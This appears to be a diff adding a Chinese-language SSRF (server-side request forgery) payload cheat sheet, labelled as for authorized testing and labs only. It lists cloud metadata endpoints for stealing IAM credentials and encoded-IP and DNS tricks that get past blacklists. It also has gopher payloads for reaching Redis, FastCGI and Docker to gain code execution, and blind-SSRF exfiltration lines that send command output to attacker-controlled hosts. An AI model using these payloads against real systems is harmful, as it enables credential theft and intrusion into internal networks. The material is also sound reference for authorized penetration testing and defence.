@@ -1,0 +1,89 @@
+==========================================================================
+ SSRF 服务端请求伪造 Payload 与绕过速查
+ 仅用于授权测试与靶场
+==========================================================================
+
+【0x01 内网/本机探测目标】
+  http://127.0.0.1/  http://localhost/  http://0.0.0.0/
+  http://127.0.0.1:80/  :8080 :8000 :8888 :9090 :3000 :5000 :6379 :3306
+  :27017(mongo) :9200(es) :8500(consul) :8848(nacos) :2375(docker)
+  云元数据（必打）:
+    AWS       169.254.169.254/latest/meta-data/
+              169.254.169.254/latest/meta-data/iam/security-credentials/<role>
+              v2 先拿 token: PUT /latest/api/token X-aws-ec2-metadata-token-ttl-seconds:21600
+    阿里云    100.100.100.200/latest/meta-data/
+              100.100.100.200/latest/meta-data/ram/security-credentials/<role>
+    腾讯云    metadata.tencentyun.com/latest/meta-data/
+    华为云    169.254.169.254/openstack/latest/securitykey
+    GCP       metadata.google.internal/computeMetadata/v1/  (头 Metadata-Flavor:Google)
+    Azure     169.254.169.254/metadata/instance?api-version=2021-02-01 (头 Metadata:true)
+    DigitalOcean 169.254.169.254/metadata/v1.json
+    Oracle    169.254.169.254/opc/v2/instance/
+
+【0x02 IP 表示法绕过（黑名单匹配 127.0.0.1 时）】
+  进制变形:
+    127.0.0.1
+    2130706433                    # 十进制整数
+    0x7f000001                    # 十六进制
+    017700000001                  # 八进制
+    127.1                         # 省略写法
+    127.0.1                       # 两段式
+    0x7f.0x0.0x0.0x1
+    127.0x1.0x1.0x1
+    0177.0.0.1
+    [::1]  http://[::1]/  http://[::ffff:127.0.0.1]/
+    0:0:0:0:0:ffff:7f00:1
+    127。0。0。1                  # 中文句号（部分框架会规范化）
+  DNS:
+    nip.io:        127.0.0.1.nip.io / 10.0.0.1.nip.io
+    sslip.io:      127.0.0.1.sslip.io
+    自己注册 A 记录指向 127.0.0.1（最稳，绕正则）
+    localtest.me  customer1.app.localhost
+  解析差异/重定向:
+    http://attacker/302 -> http://127.0.0.1   （服务端跟随跳转，用 --resolve 或短链）
+    http://attacker@127.0.0.1/  http://attacker#127.0.0.1/
+    http://127.0.0.1\@attacker/  http://127.0.0.1%00.attacker/
+    http://①②⑦.⓪.⓪.①/  (Unicode/同形异义，部分库兼容)
+  短链/302 平台: 自己起 http.server 返回:
+    <?php header("Location: gopher://...");
+    Flask: redirect("http://127.0.0.1:6379/")
+
+【0x03 协议利用】
+ file://  读文件: file:///etc/passwd  file:///C:/Windows/win.ini
+ dict://  dict://127.0.0.1:6379/INFO
+ gopher:// 打内网 TCP（Redis/MySQL/FastCGI）:
+    gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall...
+    用 Gopherus 生成:  python3 gopherus.py --exploit redis
+ dict://127.0.0.1:6379/info
+ tftp:// ldap:// jar:// netdoc:/// (Java)
+ PHP:  expect://  curl 支持的全协议
+ Java: netdoc:///etc/passwd 、jar:netdoc://
+ SSRF 打 Redis(无认证) 写 SSH key / crontab / webshell / 主从 RCE
+ SSRF 打 FastCGI(9000): gopher 构造 FCGI 任意代码执行（fcgi_exp）
+ SSRF 打 Docker API(2375): /containers/json、/exec 起容器挂载根目录
+ SSRF 打 Consul(8500)/Nacos(8848)/SpringBoot actuator
+    /nacos/v1/auth/users?username=x&password=x  (默认添加用户)
+    /actuator/env 改 logging.config 指向恶意 logback XML -> RCE
+
+【0x04 盲 SSRF（无回显）】
+ 1) 外带通道: 自建监听 nc -lvnp 80；
+    http://你的VPS/?x=`id|base64` 、DNSLog: http://xxx.dnslog.cn/
+    参数里放命令结果外带: 访问 http://127.0.0.1 后再请求 http://attacker/<title>
+ 2) 布尔判断: 端口开放与否响应时间/状态/长度不同，写脚本二分爆破
+ 3) 时间: http://127.0.0.1:port 对开放/关闭端口的超时差异
+ 4) 内容外带: gopher 拿数据后 -> curl http://attacher/?d=$(...)
+
+【0x05 常见功能点（参数名）】
+ url= link= src= source= target= dest= redirect= uri=
+ domain= host= to= image= img= pic= fetch= callback= continue=
+ web= page= path= api= proxy= feed= load= file= data=
+ webhook（钉钉/企业微信机器人配置）、在线翻译、PDF 生成、图片处理、
+ 头像远程下载、RSS 订阅、导入配置、远程安装包
+
+【0x06 防护绕过补充】
+ URL 白名单包含目标域名: http://target.com@127.0.0.1、http://127.0.0.1/target.com
+ 结尾校验: http://127.0.0.1/?target.com、http://127.0.0.1#target.com
+ 二次解析: http://127.0.0.1%2523@target.com、http://127.0.0.1%0d%0aHost:target
+ DNS rebinding（rebind.it / rbndr.us）：首次解析外网过校验，二次解析 127.0.0.1
+ 限制只能 http(s): 用 302 跳转转 gopher/file；或找开放 http 服务的内网组件
+==========================================================================
